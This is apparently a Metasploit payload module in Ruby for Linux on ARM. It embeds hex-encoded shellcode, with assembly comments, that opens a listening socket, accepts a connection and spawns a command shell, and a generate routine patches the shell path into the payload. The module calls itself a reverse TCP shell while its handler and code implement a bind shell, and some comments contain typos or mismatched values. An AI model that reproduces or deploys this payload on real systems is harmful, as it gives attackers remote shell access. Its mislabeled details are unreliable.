##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 208

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Version'       => '',
      'Description'   => 'Connect to target and spawn a command shell',
      'Author'        => ['civ', 'hal'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'RHOST'    => [ 172, 'ADDR' ],
              'LPORT'    => [ 170, 'n' ],
            },
          'Payload' =>
            [
              # socket
              0xe3a00002, # mov     r0, #2
              0xe3a01001, # mov     r1, #1
              0xe3a02006, # mov     r2, #6
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe2877019, # add     r7, r7, #25
              0xef000000, # svc     0x00000000
              0xe1a06000, # mov     r6, r0

              # bind
              0xe28f1080, # 1dr     r1, pc, #128
              0xe3a02010, # mov     r2, #16
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe287701a, # add     r7, r7, #26
              0xef000000, # svc     0x00000000

              # listen
              0xe1a00006, # mov     r0, r6
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe287701c, # add     r7, r7, #28
              0xef000000, # svc     0x00000000

              # accept
              0xe1a00006, # mov     r0, r6
              0xe0411001, # sub     r1, r1, r1
              0xe0422002, # sub     r2, r2, r2
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe287701d, # add     r7, r7, #29
              0xef000000, # svc     0x00000000

              # dup
              0xe1a06000, # mov     r6, r0
              0xe3a01002, # mov     r1, #2
              0xe1a00006, # mov     r0, r6
              0xe3a0703f, # mov     r7, #63 ; 0x3f
              0xef000000, # svc     0x00000000
              0xe2511001, # subs    r1, r1, #1
              0x5afffffa, # bpl     8c <.text+0x8c>

              # execve("/system/bin/sh", args, env)
              0xe28f0024, # add     r0, pc, #36     ; 0x24
              0xe0244004, # eor     r4, r4, r4
              0xe92d0010, # push    {r4}
              0xe1a0200d, # mov     r2, sp
              0xe28f4024, # add     r4, pc, #36     ; 0x10
              0xe92d0010, # push    {r4}
              0xe1a0100d, # mov     r1, sp
              0xe3a0700b, # mov     r7, #11 ; 0xb
              0xef000000, # svc     0x00000000

              # <af>:
              0x04290002, # .word   0x5c110002 @ port: 4444 , sin_fam = 2
              0x0101a8c0, # .word   0x0101a8c0 @ ip: 192.168.1.1

              # <shell>:
              0x00000000, # .word   0x00000000 ; the shell goes here!
              0x00000000, # .word   0x00000000
              0x00000000, # .word   0x00000000
              0x00000000, # .word   0x00000000

              # <arg>:
              0x00000000, # .word   0x00000000 ; the args!
              0x00000000, # .word   0x00000000
              0x00000000, # .word   0x00000000
              0x00000000, # .word   0x00000000

            ].pack("V*")
        }
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('SHELL', [ true, "The shell to execute.", "/bin/sh" ]),
        OptString.new('ARGV0', [ false, "argv[0] to pass to execve", "sh" ]) # mostly used for busybox
      ])
  end

  def generate
    p = super

    sh = datastore['SHELL']
    if sh.length >= 16
      raise ArgumentError, "The specified shell must be less than 16 bytes."
    end
    p[176, sh.length] = sh

    arg = datastore['ARGV0']
    if arg
      if arg.length >= 16
        raise ArgumentError, "The specified argv[0] must be less than 16 bytes."
      end
      p[192, arg.length] = arg
    end

    p
  end
end
